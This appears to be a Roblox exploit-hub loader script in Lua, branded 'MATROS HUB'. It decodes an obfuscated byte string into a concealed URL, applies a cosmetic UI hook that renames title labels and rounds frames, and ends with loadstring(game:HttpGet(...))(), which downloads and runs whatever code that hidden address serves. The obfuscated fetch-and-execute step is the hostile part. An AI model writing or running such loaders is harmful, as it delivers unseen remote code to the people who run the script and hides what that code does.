
--[[ STAGE 2: VISUAL CORE ]]
local J1P8xaVRTUM2G="\181\133\129\129\152\083\084\080\239\154\252\167\228\226\241\249\202\251\194\220\202\219\192\208\211\037\210\039\057\255\032\048\050\200\011\000\003\010\026\030\018\026\107\124\105\056\103\115\118\116\072\088\078\093\089\016\082\090\174\167\124\067\166\186\177\187\135\142\142\156\132\162\239\235\146\252\249\232\130\236\237\248\224\204\223\194\213\045\220\196\036\062\063\036\034\032\196\197\054\223\212\006\006\040\211\109\098\018"local qd7pShzf2BRbNfSN0_K=44 local goXoCnNiJY5jSd=31 local IQsNTN2vyMiHvudg3=1 local M_9T9ZipLbeHUx0bm=4 local aR4Oxt4nVpHkOAnMTDWe=14 local pueW94AbwEvWz5F4=false local ldjvLn3SXUoWBL0Rxz=bit32 and bit32.bxor if not ldjvLn3SXUoWBL0Rxz then ldjvLn3SXUoWBL0Rxz=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local TqUZQSeAeAgpXzovKX73={}for nn_8TZPLWYQllgqfG=1,#J1P8xaVRTUM2G do local e4NlP8GClgw7uIK9o=string.byte(J1P8xaVRTUM2G,nn_8TZPLWYQllgqfG)local TXH7Xw9LiFwc6F=(goXoCnNiJY5jSd+(nn_8TZPLWYQllgqfG*M_9T9ZipLbeHUx0bm)+aR4Oxt4nVpHkOAnMTDWe)%256 if IQsNTN2vyMiHvudg3==0 then e4NlP8GClgw7uIK9o=(e4NlP8GClgw7uIK9o-TXH7Xw9LiFwc6F)%256 TqUZQSeAeAgpXzovKX73[nn_8TZPLWYQllgqfG]=string.char(ldjvLn3SXUoWBL0Rxz(e4NlP8GClgw7uIK9o,qd7pShzf2BRbNfSN0_K))else e4NlP8GClgw7uIK9o=ldjvLn3SXUoWBL0Rxz(e4NlP8GClgw7uIK9o,qd7pShzf2BRbNfSN0_K)TqUZQSeAeAgpXzovKX73[nn_8TZPLWYQllgqfG]=string.char((e4NlP8GClgw7uIK9o-TXH7Xw9LiFwc6F)%256)end end local ZiwX6kzwel7wC6F=table.concat(TqUZQSeAeAgpXzovKX73)if pueW94AbwEvWz5F4 then ZiwX6kzwel7wC6F=string.reverse(ZiwX6kzwel7wC6F)end local nyFyEG37w75lXvesgprnU6=ZiwX6kzwel7wC6F
local HubName = "MATROS HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(nyFyEG37w75lXvesgprnU6))()
